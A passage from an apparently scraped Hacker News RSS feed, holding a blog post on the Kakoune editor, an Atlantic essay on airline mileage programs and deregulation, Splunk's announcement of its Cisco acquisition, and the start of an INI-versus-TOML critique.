But before I understood that, there was a <a href="https://github.com/andreyorst/dotfiles/commit/442941e8a230ccbb075a7bdfcf6075367c46cd73" target="_blank">long</a> period of <a href="https://github.com/andreyorst/dotfiles/commit/9088b4fd041005c6143de8de012541f0bc6f913f" target="_blank">adoption</a>.
I still used Kakoune, but more and more I was shifted towards Emacs - it slowly consumed me.</p>
<p>A big part of that was that I started writing in Lisps.
Emacs is <strong>the king</strong> when it comes to Lisp editing.
Plugins for various Schemes, that I used to do tasks from the SICP book were amazing, and Kakoune <code>:repl</code> command paled in comparison.
Though I can’t blame anyone here - Emacs is a lisp machine on its own, it’s bound to have great lisp editing experience.</p>
<p>Though lisp wasn’t my primary language back then, more like a novelty.
I used Rust and considered switching jobs from a C engineer to a Rust back-end developer.
Rust seemed both a perspective and a <em>safe</em> enough bet for the foreseeable future.
Who knew how the tables would turn?!</p>
<p>Kakoune actually was great as a Rust IDE of sorts.
The <a href="https://github.com/kak-lsp/kak-lsp" target="_blank">kak-lsp</a> plugin was on it, written in Rust it supported Rust well.
And it helped me at work with C too.
That was 2019, the year I started using Emacs for real.</p>
<p>That year, I made my first, kinda big post, in which I realized that I wanted to write more.
Ironically, it was a <a href="https://discuss.kakoune.com/t/i-have-been-using-emacs-at-work-for-whole-week/" target="_blank">post about Emacs on the Kakoune forum</a>.
It was even written partly in Emacs and partly in Kakoune - I was comparing editors at that time, much like the author of already mentioned videos.
But this day signified that I was ready to fully migrate to Emacs - my config was more or less ready for work at that point.
Emacs seemed better at writing, although I was missing cool Kakoune features, such as multiple selections, a lot.
I started writing this blog in 2020, and it was done in Emacs from the get-go.
Not so long after that, I moved to Emacs <a href="https://github.com/andreyorst/dotfiles/commit/0e31f525b069f097a99cd1876a009f03cd26299c" target="_blank">completely</a>.</p>
<p>I used Kakoune for 1.9835616438356165 years (first commit on Jul 24 2018, last commit on Jul 17 2020).</p>
<p>But this post actually is called “Why Kakoune” and not “Why I switched to Emacs”, so let’s address that!</p>
<h2 id="why-kakoune">Why Kakoune</h2>
<p>What an awfully long preamble.
If you read that, you have my thanks.
If not - fair enough.</p>
<p>I think it’s kinda weird to read reasoning on why someone should use Kakoune from someone who’s not using Kakoune right now and hasn’t for another three years already.
But, as far as I can see, not much has changed in Kakoune since!
Which, actually, is great - I can actually just check out to a commit previous to the one I deleted my Kakoune config in the <code>dotfiles</code> repository, and run it.
A fresh clone of Kakoune’s latest stable release builds in just two minutes on my machine, and loads my old configuration without too many errors:</p>
<figure><img src="https://andreyor.st/2023-09-20-why-kakoune/kakoune.png">
</figure>

<p>At this point of the post I wanted to write about stability, but as it seems, the situation isn’t that great.</p>
<ul>
<li>Some plugins simply no longer exist.</li>
<li>Some defaults were changed in 2022, making keys behave differently (can be turned back via a remap)</li>
<li>Some changes were made to how Kakscript is interpreted.</li>
<li>Most of my plugins broke (but that’s on me).</li>
<li>There’s possibly more, but I’m out of the loop.</li>
</ul>
<p>What’s hasn’t changed is that <a href="https://discuss.kakoune.com/t/ive-lost-my-syntax-highlighting/" target="_blank">people</a> <a href="https://discuss.kakoune.com/t/autoload-directory-disables-doc-command/1656" target="_blank">still</a> <a href="https://github.com/mawww/kakoune/issues/4301" target="_blank">stumble</a> on the <code>autoload</code> directory after all these <a href="https://github.com/mawww/kakoune/issues/1" target="_blank">years</a>.
Because there’s no plugin manager in Kakoune, it relies on storing scripts you want to load automatically during startup in the <code>~/.config/kak/autoload</code> directory.
This, however, for some weird reason, disables loading a system-wide Kakoune <code>autoload</code> directory, and Kakoune simply stops loading all of its inbuilt features that are shipped as <code>.kak</code> files.
I also experienced this problem, and it was one of the main reasons for making <code>plug.kak</code>.
So, if anything above seems too weird, perhaps Kakoune is not for you.</p>
<p>But, given all that, Kakoune hasn’t changed that drastically over the three years I haven’t used it, and that’s a good thing.
Even now, I can still edit files in it pretty comfortably after my brain does the switch from Emacs keybindings to a modal model.
For the most part, that is, some habits are hard.</p>
<p>But one thing, that I think can be a main reason why people should try Kakoune, in my opinion, is its POSIX integration.
Back in the day, I really liked this idea, can’t say so today<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup>, <strong>but</strong>, it’s still a good reason why Kakoune is interesting.</p>
<p>I mentioned that I made plugins for Kakoune, and because of that I now know POSIX sh pretty well.
Not that I need this knowledge that often, but when I do, I’m glad Kakoune taught me well.
The same goes for other POSIX tools - Kakoune basically forces you to learn your shell stuff, because there’s no other way to be productive in Kakoune.
Everything is done via shelling out to use some tool like <code>fmt</code>, <code>grep</code>, <code>find</code>, etc.</p>
<p>And when shell tools are not enough you can always call different programming languages from the shell.
For example, some of my plugins are written in Perl of all languages.
And while I can’t say that I’m proud of that, or that I know Perl that well, I can still say that Kakoune <a href="https://github.com/andreyorst/langmap.kak/blob/fe72a9980988c97ec901df1c36129b6959468b08/perl/langmap.pl" target="_blank">made</a> me <a href="https://github.com/andreyorst/langmap.kak/blob/fe72a9980988c97ec901df1c36129b6959468b08/perl/display_layout.pl" target="_blank">learn</a> <a href="https://github.com/andreyorst/kaktree/blob/acd47e0c8549afe1634a79a5bbd6d883daa8ba0a/perl/kaktree.pl" target="_blank">Perl</a>, well, to some degree.
Also, <a href="https://github.com/andreyorst/dotfiles/blob/187ebb84f9542b76a4f3c3e08f9533cd8187faa1/.config/kak/commands.kak#L151-L192" target="_blank">Awk</a>.
And I still occasionally use both when I need to send a code snippet to my colleague so that they can send me some filtered logs instead of full logs.
Because that’s what these tools excel at, and learning how to use them from within an editor really makes it apparent how they can be useful.
So Kakoune really helps you learn your standard tools, and some extra things too.</p>
<p>Another thing I think can be said is that Kakoune really makes you learn and understand regular expressions.
When I started using Kakoune, I once told my friend that I started using an editor that is built around using regular expressions for text manipulation.
They were quite skeptical, because I didn’t know regular expressions back then, and they had some experience and said that it’s a terrible idea to use them at all.
But turns out, that regular expressions are actually easy to learn, and Kakoune really helps with that, because you’re constantly creating multiple selections, selections in selections, and filtering selections - all done with regexes.
So, if you think that regexes are hard and you’ll never learn them (and you’re a Vim user by chance), give Kakoune a try.</p>
<p>And finally, Kakoune is just fun!
Especially if you’re a seasoned Vim user, the inverted paradigm of object-verb really messes with your brain.
I think Kakoune features a really unique editing model, where it doesn’t need any separate mode for selecting text - all motions do it automatically.
When I started, I adjusted to the object verb paradigm pretty quickly, it’s very natural to how things are done - in real life, we usually don’t think upfront what we want to clean and then how many of <em>what was that</em>, ah yeah the shelves.
We think that these shelves are dusty and we need to clean them.
I should probably do it right now.</p>
<p>Anyway, a TL;DR for this could as well have been:</p>
<blockquote>
<p>Kakoune gives you:</p>
<ul>
<li>Small and understandable core.</li>
<li>Proficiency with POSIX tools,
<ul>
<li>and maybe even some programming languages other than <code>sh</code>.</li>
</ul>
</li>
<li>Structural regular expressions as a central way of text manipulation.
<ul>
<li>With multiple selections created via regular expressions, acting upon regular expressions.</li>
</ul>
</li>
<li>Fresh take on the modal editing paradigm.</li>
</ul>
</blockquote>
<p>So, yeah, Kakoune definitively deserves your attention, if you’re into experiments with your workflow.
I, certainly, am.
At least, I was, now I do everything from Emacs.</p>


  </article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Airlines Are Just Banks Now (218 pts)]]></title>
            <link>https://www.theatlantic.com/ideas/archive/2023/09/airlines-banks-mileage-programs/675374/</link>
            <guid>37596755</guid>
            <pubDate>Thu, 21 Sep 2023 12:40:58 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theatlantic.com/ideas/archive/2023/09/airlines-banks-mileage-programs/675374/">https://www.theatlantic.com/ideas/archive/2023/09/airlines-banks-mileage-programs/675374/</a>, See on <a href="https://news.ycombinator.com/item?id=37596755">Hacker News</a></p>
<div id="readability-page-1" class="page"><article><header data-event-module="hero"><div><div><p>They make more money from mileage programs than from flying planes—and it shows.</p></div><div><figure><div><picture><img alt="Illustration of planes against a backdrop of a credit card" sizes="(min-width: 976px) 976px, 100vw" srcset="https://cdn.theatlantic.com/thumbor/i1zxOBjUfAa-LcAk39Vpb8-iF8U=/0x0:2000x1125/750x422/media/img/mt/2023/09/airlines_are_banks/original.jpg 750w, https://cdn.theatlantic.com/thumbor/wbxnD5HvcVxcZq5D4_fZVem-SAU=/0x0:2000x1125/828x466/media/img/mt/2023/09/airlines_are_banks/original.jpg 828w, https://cdn.theatlantic.com/thumbor/AY1IMnrdT1NrCRmGfjeURl9WzME=/0x0:2000x1125/960x540/media/img/mt/2023/09/airlines_are_banks/original.jpg 960w, https://cdn.theatlantic.com/thumbor/tYcp3eiVo3YWMCqFQx21qfiBwtE=/0x0:2000x1125/976x549/media/img/mt/2023/09/airlines_are_banks/original.jpg 976w, https://cdn.theatlantic.com/thumbor/_Tgm4RT8P6wSfIJSTVjg7zzGljA=/0x0:2000x1125/1952x1098/media/img/mt/2023/09/airlines_are_banks/original.jpg 1952w" src="https://cdn.theatlantic.com/thumbor/AY1IMnrdT1NrCRmGfjeURl9WzME=/0x0:2000x1125/960x540/media/img/mt/2023/09/airlines_are_banks/original.jpg" width="960" height="540"></picture></div><figcaption>Illustration by The Atlantic. Sources: Getty.</figcaption></figure></div></div><div><p><time datetime="2023-09-21T11:00:00Z">September 21, 2023, 7 AM ET</time></p></div><gpt-ad format="injector" sizes-at-0="mobile-wide" targeting-pos="injector-article-start" sizes-at-976="desktop-wide"></gpt-ad></header><section data-event-module="article body"><p>L<span>ast week</span>, Delta Air Lines announced <a data-event-element="inline link" href="https://thepointsguy.com/news/delta-skymiles-changes/">changes</a> to its SkyMiles program that will make accruing status and taking advantage of perks much harder. Instead of relying on a combination of dollars spent and miles traveled in the air, Delta will grant status based on a single metric—dollars spent—and raise the amount of spending required to get it. In short, SkyMiles is no longer a frequent-flier program; it’s a big-spender program. These changes are so drastic that one of the reporters at the preeminent travel-rewards website The Points Guy <a data-event-element="inline link" href="https://thepointsguy.com/news/why-i-wont-chase-airline-status/">declared</a> that he’s going to “stop chasing airline status.”</p><p>When even the points insiders are sick of playing the mileage game, something has clearly gone wrong. In fact, frequent-flier programs are a symptom of a much deeper rot in the American air-travel industry. And although getting mad at airlines is perfectly reasonable, the blame ultimately lies with Congress.</p><p>From the late 1930s through the ’70s, the federal government regulated airlines as a public utility. The Civil Aeronautics Board decided which airlines could fly what routes and how much they could charge. It aimed to set prices that were fair for travelers and that would provide airlines with a modest profit. Then, in 1978, Congress passed a sweeping law deregulating the airline industry and ultimately abolishing the CAB. Unleashed from regulation, airlines devised new tactics to capture the market. American Airlines was one of the most aggressive. In the lead-up to the deregulation bills, it created discount “super saver” fares to sell off the final few remaining seats on planes. That meant cheap prices for last-minute travelers and more revenue for American, because the planes were going to take off whether or not the seat was filled. But these fares upset business travelers, who tended to buy tickets further in advance for higher prices. So in <a data-event-element="inline link" href="https://www.yahoo.com/news/timeline-events-american-airlines-history-011902886.html?guccounter=1">1981</a>, American developed AAdvantage, its frequent-flier program, to give them additional benefits. Other airlines followed suit.</p><p id="injected-recirculation-link-0" data-view-action="view link - injected link - item 1" data-event-element="injected link" data-event-position="1"><a href="https://www.theatlantic.com/newsletters/archive/2022/06/summer-air-travel-flights-cancelled/661385/">Read: Air travel is a disaster right now. Here’s why.</a></p><p>In the early years, these programs were simple, like the punch card at a café where your 11th coffee is free. But three big changes transformed them into the systems we know today. First, in 1987, American partnered with Citibank to offer a branded credit card that offered points redeemable for flights on the airline. Second, in the ’90s, the airlines proliferated the number of fare classes, charging differential prices for tickets. With more complicated fare structures came the third change: Virgin America realized that the amount people spend on a flight, based on the fare class, is more important to their bottom line than the number of miles flown. So, in 2007, it introduced a loyalty <a data-event-element="inline link" href="https://www.usatoday.com/story/travel/roadwarriorvoices/2016/02/25/frequent-flier-miles-points-loyalty-programs/80860962/">program</a> rewarding money spent rather than mileage accrued.</p><p>These three shifts fundamentally transformed the airline industry. They turned frequent-flier systems into the sprawling points systems they are today. And they turned airlines into something more like financial institutions that happen to fly planes on the side.</p><p>Here’s how the system works now: Airlines create points out of nothing and sell them for real money to banks with co-branded credit cards. The banks award points to cardholders for spending, and both the banks and credit-card companies make money off the swipe fees from the use of the card. Cardholders can redeem points for flights, as well as other goods and services sold through the airlines’ proprietary e-commerce portals.</p><p>For the airlines, this is a great deal. They incur no costs from points until they are redeemed—or ever, if the points are forgotten. This setup has made loyalty programs highly lucrative. <a data-event-element="inline link" href="https://www.fastcompany.com/90934980/how-much-do-we-charge-to-our-delta-air-american-express-cards-its-a-lot">Consumers now</a> charge nearly 1 percent of U.S. GDP to Delta’s American Express credit cards alone. A 2020 analysis by the <i>Financial Times</i> <a data-event-element="inline link" href="https://www.ft.com/content/1bb94ed9-90de-4f15-aee0-3bf390b0f85e">found</a> that Wall Street lenders valued the major airlines’ mileage programs more highly than the airlines themselves. United’s MileagePlus program, for example, was valued at $22 billion, while the company’s market cap at the time was only $10.6 billion.</p><p>Is this a good deal for the American consumer? That’s a trickier question. Paying for a flight or a hotel room with points may feel like a free bonus, but because credit-card-swipe fees increase prices across the economy—Visa or Mastercard takes a cut of every sale—redeeming points is more like getting a little kickback. Certainly the system is bad for Americans who don’t have points-earning cards. They pay higher prices on ordinary goods and services but don’t get the points, effectively <a data-event-element="inline link" href="https://www.brookings.edu/articles/how-credit-card-companies-reward-the-rich-and-punish-the-rest-of-us/">subsidizing</a> the perks of card users, who tend to be wealthier already.</p><p>Like the federal reserve, airlines issue currency—points—out of thin air. They also get to decide how much that currency is worth and what it can be spent on. This helps explain why the points system feels so opaque and, often, unfair. Online analysts try to offer estimates of points’ cash value, but airlines can <a data-event-element="inline link" href="https://viewfromthewing.com/delta-air-lines-is-even-devaluing-your-banked-rollover-elite-qualifying-miles/">reduce</a> these <a data-event-element="inline link" href="https://viewfromthewing.com/delta-ceo-were-not-done-making-changes-to-skymiles-status-or-first-class/">values</a> after the fact and change how points can be redeemed. Airlines even <a data-event-element="inline link" href="https://www.forbes.com/advisor/credit-cards/is-buying-frequent-flyer-miles-ever-a-good-deal/">sell</a> <a data-event-element="inline link" href="https://www.nerdwallet.com/article/travel/times-it-actually-makes-sense-to-buy-miles">points</a> at above their exchange-rate valuation, meaning that people are paying for something worth less than the money they’re buying it with, in part because it’s so hard to know what the real value is.</p><p>In this context, it’s easy to see why Delta is making changes. The shift to a focus on spending, rather than mileage, has long been coming, because of the rise of multiple fare classes and the decoupling of mileage and revenue. Limiting benefits and increasing the requirements for status, meanwhile, looks like a way to spread out costs: 1 percent of GDP spending is a lot of outstanding points that could be redeemed.</p><p>Still, you might wonder how airlines can get away with angering their customers by devaluing loyalty programs. Aren’t they worried that those customers will get a little less loyal? Well, not really. The U.S. has only four major carriers, which <a data-event-element="inline link" href="https://www.npr.org/2023/03/07/1161640389/jetblue-spirit-airlines-doj-lawsuit">account</a> for more than three-quarters of the market, and they tend to move in lockstep. Indeed, American Airlines recently made a <a data-event-element="inline link" href="https://thepointsguy.com/news/american-aadvantage-vs-delta-skymiles/">similar</a> change to its mileage program. Customers don’t have many other places to go.</p><p>I<span>n this</span> and other respects, the strange evolution of airlines into quasi-banks reflects how badly deregulation has gone. Regulation carefully set the terms under which airlines could do business. It was designed to ensure that they remained a stable business and a reliable mode of transportation. Deregulation, in turn, allowed the airlines to pursue profits in whatever way they could—including getting into the financial sector.</p><p>The proponents of deregulation made a few big promises. The cost of flying would go down once airlines were free to compete on price. The industry would get less monopolistic as hundreds of new players entered the market, and it would be stable even without the government guaranteeing profitable rates. Small cities wouldn’t lose service. In the deregulators’ minds, airlines were like any other business. If they were allowed to compete freely, the magic of the market would make everything better. Whatever was good for the airlines’ bottom line would be good for consumers.</p><p>They were wrong. As I explain in my <a data-event-element="inline link" href="https://tertulia.com/book/why-flying-is-miserable-and-how-to-fix-it-ganesh-sitaraman/9798987053584?affiliate_id=atl-347">forthcoming book</a>, most of their predictions didn’t come true, because air travel isn’t a normal business. There are barriers to entry, such as the fixed supply of airport runways and gates. (And, for that matter, mileage programs, designed to keep customers from ditching an established airline for a rival.) There are network effects and economies of scale. There are high capital costs. (Airplanes aren’t cheap.) The idea that anyone could successfully start an airline and outcompete the big incumbents never made much sense.</p><p>After a relatively short period of fierce competition, the deregulated era quickly turned to consolidation and cost-cutting, as dozens of airlines either went bankrupt or were acquired. Service keeps getting worse, because the airlines, facing little competition, have nothing to fear from antagonizing passengers with cramped legroom, cancellations, and ever-multiplying fees for baggage and snacks. Worse still, without mandated service, cities and regions across the country have lost commercial air service, with <a data-event-element="inline link" href="https://washingtonmonthly.com/2012/03/01/terminal-sickness/">serious consequences</a> for their economies. And when a crisis like 9/11 or the coronavirus pandemic comes along, the airlines—which prefer to direct their profits to stock buybacks rather than rainy-day funds—need massive financial relief from the federal government.</p><p id="injected-recirculation-link-1" data-view-action="view link - injected link - item 2" data-event-element="injected link" data-event-position="2"><a href="https://www.theatlantic.com/technology/archive/2023/06/airline-customer-service-chatbot-ai/674412/">Read: Somehow, airline customer service is getting even worse</a></p><p>Deregulation even failed to deliver the one thing it is sometimes credited with: lowering prices. Airfare did get cheaper in the years after the 1978 deregulation law. But the cost of flying had already been falling before<i> </i>deregulation, and it kept falling after at about the same rate.</p><p>The old system of airline regulation wasn’t perfect. Barred from competing directly on price, the airlines got into an amenities arms race that notoriously included <a data-event-element="inline link" href="https://www.youtube.com/watch?v=KnimcgMPuXk">in-flight piano bars</a>. But the cure was worse than the disease. The industry went from being a regulated oligopoly, which had real problems, to an unregulated oligopoly, which we are now seeing is much worse.</p><p>Airlines serve a vital public need, just like railroads, the electric grid, and communication networks. They also exist within a system of special privileges from the government. The public has built and paid for a substantial federal infrastructure to coordinate flights safely. Historically, these are all standard reasons to regulate an industry. A modernized set of rules could arrest the trajectory of airlines becoming financialized e-commerce platforms—and maybe even get them to focus on making air travel less miserable.</p><div data-view-action="view - affiliate module" data-view-label="Why Flying Is Miserable - And How To Fix It"><a href="https://web.tertulia.com/book/9798987053584?affiliate=atl-347" rel="noopener noreferrer" data-label="Why Flying Is Miserable - And How To Fix It" data-action="click link - affiliate module - book cover" target="_blank"><picture><img alt="" loading="lazy" srcset="https://cdn.theatlantic.com/thumbor/Zh_7jqRmMvGK6Gg6nXJl9R3pn9E=/0x0:333x500/80x120/media/img/book_reviews/2023/09/19/51XeRgTLhgL._SL500_/original.jpg, https://cdn.theatlantic.com/thumbor/KdBuSjWrqT4SQxIcOGX5eMfm2WE=/0x0:333x500/160x240/media/img/book_reviews/2023/09/19/51XeRgTLhgL._SL500_/original.jpg 2x" src="https://cdn.theatlantic.com/thumbor/Zh_7jqRmMvGK6Gg6nXJl9R3pn9E=/0x0:333x500/80x120/media/img/book_reviews/2023/09/19/51XeRgTLhgL._SL500_/original.jpg" width="80" height="120"></picture></a></div><div><hr><p>​When you buy a book using a link on this page, we receive a commission. Thank you for supporting<!-- --> <span>The Atlantic.</span></p></div></section><gpt-ad format="injector" sizes-at-0="mobile-wide,native,house" targeting-pos="injector-most-popular" sizes-at-976="desktop-wide,native,house"></gpt-ad></article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[BrainTree has been down for more than 7 hours now (130 pts)]]></title>
            <link>https://www.paypal-status.com/incident/production</link>
            <guid>37596498</guid>
            <pubDate>Thu, 21 Sep 2023 12:15:19 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.paypal-status.com/incident/production">https://www.paypal-status.com/incident/production</a>, See on <a href="https://news.ycombinator.com/item?id=37596498">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Cisco Acquires Splunk (610 pts)]]></title>
            <link>https://www.splunk.com/en_us/blog/leadership/splunk-and-cisco-unite-to-accelerate-digital-resilience-as-one-of-the-leading-global-software-companies.html</link>
            <guid>37596497</guid>
            <pubDate>Thu, 21 Sep 2023 12:15:19 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.splunk.com/en_us/blog/leadership/splunk-and-cisco-unite-to-accelerate-digital-resilience-as-one-of-the-leading-global-software-companies.html">https://www.splunk.com/en_us/blog/leadership/splunk-and-cisco-unite-to-accelerate-digital-resilience-as-one-of-the-leading-global-software-companies.html</a>, See on <a href="https://news.ycombinator.com/item?id=37596497">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-emptytext="Blogs details page content">
            <p>For nearly 20 years, Splunk has been delivering on the idea that harnessing the power of data can help our customers solve the most complex problems that test the resilience of their digital systems. In recent years, the advent of AI and continued demand for digital transformation have created a world of new possibilities, along with complex challenges. Organizations now have a greater surface area to protect and infinitely more data to manage — often across fragmented, hybrid and multi-cloud environments.</p>
<p>As our customers have had to evolve to meet these challenges, Splunk has transformed to deliver exceptional value. Along the way, we have stayed true to our customer promise: to be a step ahead of their needs and continually deliver meaningful innovations that keep mission-critical systems secure and reliable.&nbsp;</p>
<p><span><b>Today, we took the next step in our journey to advance this promise and realize our vision for the future of security and observability by joining forces with Cisco.</b></span></p>
<p>Uniting with Cisco is a transformative milestone for Splunk and our customers, partners, employees and shareholders. Cisco and Splunk have had a long and successful partnership, underpinned by products and capabilities that fundamentally complement each other and enhance the value we deliver to customers. By bringing our two companies together, we will be able to build on our industry-leading solutions to deliver the most comprehensive visibility and insight in the market across security, observability and network operations. Combining our capabilities will allow us to accelerate our work to transform the industry for the benefit of all of our stakeholders.</p>
<p>Innovation, execution and the drive to deliver on our customer promise will always be at the core of Splunk’s mission. With Cisco, we will have greater resources to innovate and serve our customers, accelerating their digital resilience. Cisco’s world-class go-to-market engine and extensive global network of trusted partners can bring Splunk’s enterprise-grade AI-powered, security and observability solutions to even more customers worldwide. At the same time, we will have the opportunity to accelerate the pace of innovation and develop game-changing solutions to help businesses access, analyze and act on data faster and more securely than ever before. Simply put, our leading technologies, coupled with Cisco’s technology portfolio and powered by its extensive go-to-market capabilities and global scale, is a winning combination for our customers, our industry and our people.</p>
<p>I’m excited by what’s next for Splunk as part of Cisco. For our Splunkers around the globe, today’s announcement is a testament to their hard work, innovative vision and belief that our technology can help organizations all over the world become more resilient and ultimately realize their potential. The talent and drive that made today possible are only going to be more important in the years to come.&nbsp;</p>
<p>Over the years, we’ve created a vibrant community and ecosystem that brings together the most visionary technology minds of our generation. This announcement reinforces our unwavering commitment to helping build a safer and more resilient digital world, and I hope you’ll join us as we celebrate this achievement and continue to write Splunk’s legacy.&nbsp;&nbsp;</p>
<p>For more information, please read our <a href="https://www.splunk.com/en_us/newsroom/press-releases/2023/cisco-to-acquire-splunk-to-help-make-organizations-more-secure-and-resilient-in-an-ai-powered-world.html" target="_blank">press release</a>.</p>
<p>Gary Steele<br>
President &amp; CEO, Splunk</p>
<hr>

<p><b><i>Forward-Looking Statements</i></b></p>
<p><i>This communication contains “forward-looking statements” within the meaning of the federal securities laws, including Section 27A of the Securities Act of 1933, as amended, and Section 21E of the Securities Exchange Act of 1934, as amended. These forward-looking statements are based on Splunk’s current expectations, estimates and projections about the expected date of closing of the proposed transaction and the potential benefits thereof, its business and industry, management’s beliefs and certain assumptions made by Splunk and Cisco, all of which are subject to change. In this context, forward-looking statements often address expected future business and financial performance and financial condition, and often contain words such as “expect,” “anticipate,” “intend,” “plan,” “believe,” “could,” “seek,” “see,” “will,” “may,” “would,” “might,” “potentially,” “estimate,” “continue,” “expect,” “target,” similar expressions or the negatives of these words or other comparable terminology that convey uncertainty of future events or outcomes. All forward-looking statements by their nature address matters that involve risks and uncertainties, many of which are beyond our control, and are not guarantees of future results, such as statements about the consummation of the proposed transaction and the anticipated benefits thereof. These and other forward-looking statements, including the failure to consummate the proposed transaction or to make or take any filing or other action required to consummate the transaction on a timely matter or at all, are not guarantees of future results and are subject to risks, uncertainties and assumptions that could cause actual results to differ materially from those expressed in any forward-looking statements. Accordingly, there are or will be important factors that could cause actual results to differ materially from those indicated in such statements and, therefore, you should not place undue reliance on any such statements and caution must be exercised in relying on forward-looking statements. Important risk factors that may cause such a difference include, but are not limited to: (i) the completion of the proposed transaction on anticipated terms and timing, including obtaining shareholder and regulatory approvals, anticipated tax treatment, unforeseen liabilities, future capital expenditures, revenues, expenses, earnings, synergies, economic performance, indebtedness, financial condition, losses, future prospects, business and management strategies for the management, expansion and growth of Splunk’s business and other conditions to the completion of the transaction; (ii) the impact of the COVID-19 pandemic on Splunk’s business and general economic conditions; (iii) Splunk’s ability to implement its business strategy; (iv) significant transaction costs associated with the proposed transaction; (v) potential litigation relating to the proposed transaction; (vi) the risk that disruptions from the proposed transaction will harm Splunk’s business, including current plans and operations; (vii) the ability of Splunk to retain and hire key personnel; (viii) potential adverse reactions or changes to business relationships resulting from the announcement or completion of the proposed transaction; (ix) legislative, regulatory and economic developments affecting Splunk’s business; (x) general economic and market developments and conditions; (xi) the evolving legal, regulatory and tax regimes under which Splunk operates; (xii) potential business uncertainty, including changes to existing business relationships, during the pendency of the merger that could affect Splunk’s financial performance; (xiii) restrictions during the pendency of the proposed transaction that may impact Splunk’s ability to pursue certain business opportunities or strategic transactions; and (xiv) unpredictability and severity of catastrophic events, including, but not limited to, acts of terrorism or outbreak of war or hostilities, as well as Splunk’s response to any of the aforementioned factors. These risks, as well as other risks associated with the proposed transaction, are more fully discussed in the Proxy Statement to be filed with the U.S. Securities and Exchange Commission in connection with the proposed transaction. While the list of factors presented here is, and the list of factors presented in the Proxy Statement will be, considered representative, no such list should be considered to be a complete statement of all potential risks and uncertainties. Unlisted factors may present significant additional obstacles to the realization of forward looking statements. Consequences of material differences in results as compared with those anticipated in the forward-looking statements could include, among other things, business disruption, operational problems, financial loss, legal liability to third parties and similar risks, any of which could have a material adverse effect on Splunk’s financial condition, results of operations, or liquidity. Splunk does not assume any obligation to publicly provide revisions or updates to any forward-looking statements, whether as a result of new information, future developments or otherwise, should circumstances change, except as otherwise required by securities and other applicable laws.</i></p>
<p><b><i>Important Information and Where to Find It</i></b></p>
<p><i>In connection with the proposed transaction between Splunk Inc. (“Splunk”) and Cisco Systems, Inc. (“Cisco”), Splunk will file with the Securities and Exchange Commission (“SEC”) a proxy statement (the “Proxy Statement”), the definitive version of which will be sent or provided to Splunk stockholders. Splunk may also file other documents with the SEC regarding the proposed transaction. This document is not a substitute for the Proxy Statement or any other document which Splunk may file with the SEC. INVESTORS AND SECURITY HOLDERS ARE URGED TO READ THE PROXY STATEMENT AND ANY OTHER RELEVANT DOCUMENTS THAT ARE FILED OR WILL BE FILED WITH THE SEC, AS WELL AS ANY AMENDMENTS OR SUPPLEMENTS TO THESE DOCUMENTS, CAREFULLY AND IN THEIR ENTIRETY BECAUSE THEY CONTAIN OR WILL CONTAIN IMPORTANT INFORMATION ABOUT THE PROPOSED TRANSACTION AND RELATED MATTERS. Investors and security holders may obtain free copies of the Proxy Statement (when it is available) and other documents that are filed or will be filed with the SEC by Splunk through the website maintained by the SEC at www.sec.gov, Splunk’s investor relations website at <a href="https://investors.splunk.com/" target="_blank">https://investors.splunk.com</a> or by contacting the Splunk investor relations department at the following:</i></p>
<p><i>Splunk Inc.<br>
<a href="mailto:ir@splunk.com" target="_blank">ir@splunk.com</a>&nbsp;<br>
(415) 848-8400</i></p>
<p><b><i>Participants in the Solicitation</i></b></p>
<p><i>Splunk and certain of its directors and executive officers may be deemed to be participants in the solicitation of proxies in respect of the proposed transaction. Information regarding Splunk’s directors and executive officers, including a description of their direct interests, by security holdings or otherwise, is contained in Splunk’s proxy statement for its 2023 annual meeting of stockholders, which was filed with the SEC on May 9, 2023. Splunk stockholders may obtain additional information regarding the direct and indirect interests of the participants in the solicitation of proxies in connection with the proposed transaction, including the interests of Splunk directors and executive officers in the transaction, which may be different than those of Splunk stockholders generally, by reading the Proxy Statement and any other relevant documents that are filed or will be filed with the SEC relating to the transaction. You may obtain free copies of these documents using the sources indicated above.</i></p>

          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[An INI Critique of TOML (2021) (117 pts)]]></title>
            <link>https://github.com/madmurphy/libconfini/wiki/An-INI-critique-of-TOML</link>
            <guid>37595766</guid>
            <pubDate>Thu, 21 Sep 2023 10:41:02 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/madmurphy/libconfini/wiki/An-INI-critique-of-TOML">https://github.com/madmurphy/libconfini/wiki/An-INI-critique-of-TOML</a>, See on <a href="https://news.ycombinator.com/item?id=37595766">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
                <p><em>Be conservative in what you do, be liberal in what you accept from others.</em></p>
<p>— <a href="https://en.wikipedia.org/wiki/Robustness_principle" rel="nofollow">Postel's law</a></p>
<p>Comparing TOML and INI is not straightforward. The first is a unique standard, the second is a federation of dialects. All INI dialects however are well-defined (every INI file is parsed by some application, and by studying a parser's source code it is <a href="https://github.com/madmurphy/libconfini/wiki/INI-formats">possible to deduce its rules</a>), and, if one looks closely, the number of INI dialects actually used in the wild is not infinite. With an inclusive approach in mind, <strong>libconfini</strong> tries to acknowledge, catalog and extend many of them, so that what once was an informal standard becomes a flexible standard engraved by years of common habits. In referring to “the INI format” this document implicitly refers to that fluid format that <strong>libconfini</strong> is able to parse; and such flexibility is referred to as one of the language's intrinsic features.</p>
<p>Although it claims to be a human-friendly language, TOML constitutes a step back into something more robotic and primitive when compared to INI files and <strong>libconfini</strong>'s approach. Some of TOML's problems are shared with JSON, which is a problematic format outside the ECMAScript realm. Other are instead problems that TOML has created on its own. The reasons why this document addresses TOML and not, for example, JSON or YAML are two. The first obvious reason is that TOML's syntax is so similar to INI that it is useful to draw a line in front of other formats' problematic design and explain why INI is something else. The other reason is that, while other formats like YAML modestly define themselves as “official subsets” of JSON (which was not born as a configuration format, but rather as a serialization format), TOML claims to be a “minimal configuration file format” – despite being another, definitely not minimal, JSON preprocessor, with dates.</p>
